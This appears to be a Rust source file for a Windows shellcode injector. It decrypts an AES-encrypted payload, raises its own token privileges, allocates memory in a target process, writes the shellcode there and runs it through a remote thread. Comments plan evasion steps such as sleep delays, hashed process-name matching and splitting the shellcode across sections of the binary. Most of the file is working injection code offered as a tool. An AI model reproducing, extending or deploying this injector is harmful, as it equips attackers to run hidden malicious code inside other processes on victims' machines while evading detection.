
use std::thread::current;

use libaes::Cipher;

// Importing shellcode variables from shellcode.rs
mod shellcode;
use shellcode::{SHELLCODE, KEY, INITVEC};

// Importing required syscall wrappers from syscall.rs:
mod syscalls;
use syscalls::*;

struct EncryptedShellcode<'a> {
    shellcode: &'a[u8],
    key: [u8; 32],
    iv: [u8; 16],
}

impl EncryptedShellcode<'_> { 
    fn decrypt(&self) -> Vec<u8> {
        let cipher = Cipher::new_256(&self.key);
        cipher.cbc_decrypt(&self.iv, &self.shellcode)
    }
}


// TODO:

// Clean up DebugPrivilege check
// first check if we're running with admin perms or not, if we are, try to inject without the debugpriv.
// if it doesn't work, get debug priv and then acquire a handle.
// syscall debugpriv fetch?
// Move shellcode to different sections inside the binary, so it's split up.



// The current execution flow idea is as follows:
// This program starts, it sleeps for 30 seconds.
// After sleeping, it'll look for a specified process 
// by matching hashed names against a hash.
// If it finds the specified process, it'll allocate
// a new block of WRITE space, where it´ll write and drop a payload.
// Now, after sleeping for 10 seconds, this will turn the page to EXECUTE
// and start the thread execution. Now, we close the handle(s) and continue our lives.


// Debug run: $notepadProcess = Start-Process -FilePath "notepad.exe" -PassThru ; cargo run -- $notepadProcess.Id

fn main() {


    let encrypted_payload = EncryptedShellcode{
        shellcode: SHELLCODE, 
        key: KEY, 
        iv: INITVEC
    };
    let payload = encrypted_payload.decrypt();
    
    let args: Vec<String> = std::env::args().collect();
    // Ensure at least one argument (the program name) is provided
    if args.len() < 2 {
        println!("Usage: {} <pid>", args[0]);
        return;
    }

    // Parse the argument into a usize
    let target_pid: usize = match args[1].parse() {
        Ok(num) => num,
        Err(_) => {
            println!("Error: Invalid input! Defaulting to 0.");
            0
        }
    };
    let pids = enumerate_processes().unwrap();
    let own_pid = pids.last().unwrap();
    
    let mut current_process = WindowsProcess::from_pid(target_pid);
    let mut own_process = WindowsProcess::from_pid(*own_pid);
    own_process.get_handle();

    // Whatever the fuck this is:
    let token = get_token_handle(*own_process.handle.unwrap()).unwrap();
    
    adjust_token_privileges(token);

    match current_process.get_handle(){
        Ok(_) => println!("[+] Acquired handle."),
        Err(e) => panic!("[!] Failure acquiring handle!\n -> {:#x}", e.0),
    }

    let address_start = match current_process.virtual_alloc(
        None, 
        Some(0x40),
        Some(payload.len()),
        None
    ) {
        Ok(address)  => { 
            println!("[+] VirtualAlloc succeeded.\n -> {:?}", address); 
            address
        },
        Err(e) => panic!("[!] VirtualAlloc error!\n-> {:#x}", e.0),
    };
    match current_process.write_process_memory(
        address_start as usize, 
        payload.to_vec()
    ){
        Ok(_) => println!("[+] WriteProcessMemory succeeded."),
        Err(e) => eprintln!("[!] WriteProcessMemory error!\n-> {:#x}", e.0),
    }
    let mem = current_process.read_process_memory(address_start as usize, payload.len()).unwrap().0;

    match current_process.create_remote_thread_ex(
        address_start
    ){
        Ok(_) => println!("[+] CreateRemoteThread succeeded."),
        Err(e) => eprintln!("[!] CreateRemoteThread error!\n-> {:#x}", e.0),
    }
    // This is used to test that the thread does spawn, as the process terminates too quickly otherwise.

}
